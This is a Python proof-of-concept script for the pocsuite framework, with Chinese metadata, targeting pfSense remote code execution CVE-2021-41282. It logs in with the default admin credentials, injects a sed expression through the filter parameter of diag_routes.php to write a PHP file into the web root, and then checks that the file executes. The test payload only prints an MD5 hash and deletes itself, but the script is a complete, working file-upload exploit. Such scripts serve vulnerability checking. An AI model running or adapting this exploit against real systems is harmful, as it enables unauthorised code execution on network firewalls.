# coding: utf-8
import requests
import re
import urllib3
from pocsuite.lib.core.poc import Output
from pocsuite.poc import POCBase
from pocsuite.utils import register
from pocsuite.api.request import req
from pocsuite.lib.core.data import logger

class TestPOC(POCBase):

    vulID = '''pcmgr-339279'''
    version = '1'
    vulDate = 'Wed Mar 02 2022 07:15:00 GMT+0800 (China Standard Time)'
    author = 'pcmgr'
    createDate = '2022-03-05 03:15:00'
    updateDate = 'Sat Mar 05 2022 17:33:20 GMT+0800 (China Standard Time)'
    references = '''["https://www.shielder.it/advisories/pfsense-remote-command-execution/", "https://docs.netgate.com/pfsense/en/latest/releases/22-01_2-6-0.html", "https://www.shielder.it/advisories/", "http://packetstormsecurity.com/files/166208/pfSense-2.5.2-Shell-Upload.html"]'''
    name = '''pfSense 远程代码执行漏洞（CVE-2021-41282）'''
    cve = 'CVE-2021-41282'
    appPowerLink = ''
    appName = 'pfSense'
    appVersion = ''
    vulType = '文件上传 '
    vulGrade = '高危'
    vulRepair = '''目前厂商已发布升级补丁以修复漏洞，补丁获取链接： 
https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559'''
    desc = '''pfSense是一套基于FreeBSD Linux的网络防火墙。 
pfSense 存在代码注入漏洞，攻击者可利用该漏洞通过diag_routes.php来运行代码。'''
    samples = ''''''

    def _verify(self):
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]

        try:
            # get csrf token
            csrfToken = None
            path1 = "/index.php"
            resp1= requests.get(self.url+path1, timeout=10, verify=False, allow_redirects=False)
            if resp1 and resp1.status_code == 200 and "<title>pfSense - Login" in resp1.text:
                csrfToken = re.findall(r"(sid:[a-z0-9,;:]+)", resp1.text)
            if not csrfToken:
                logger.error("Could not find CSRF token")
                return result

            # login
            username = "admin"
            passwd = "pfsense"
            session = requests.Session()
            path2 = "/index.php"
            data2 = {
                "__csrf_magic": csrfToken[0],
                "usernamefld": username,
                "passwordfld": passwd,
                "login": ""
            }
            resp2= session.post(self.url+path2, data=data2, timeout=10, verify=False, allow_redirects=False)
            if resp2.status_code != 302:
                logger.info("Log in failed. User provided invalid credentials.")
            
            # upload file
            filename = "test.php"
            contents = "\\x3c\\x3fphp+var_dump(md5(123));unlink(__FILE__)\\x3b\\x3f\\x3e"
            webshell_path = "/usr/local/www/"
            params3 = "isAjax=1&filter=.*/!d;};s/Destination/"+contents+"/;w+"+webshell_path+filename+"%0a%23"
            resp3 = session.get(self.url+"/diag_routes.php", params=params3, timeout=10, verify=False, allow_redirects=False)
            if resp3.status_code != 200:
                logger.error("Upload failed.")

            # check webshell
            resp4 = session.get(self.url+"/"+filename, timeout=10, verify=False, allow_redirects=False)
            if resp4.status_code == 200 and "202cb962ac59075b964b07152d234b70" in resp4.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url

        except Exception as err:
            print(err)

        return self.parse_output(result)
    
    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        return output
    
    def _attack(self):
        return self._verify()
    




register(TestPOC)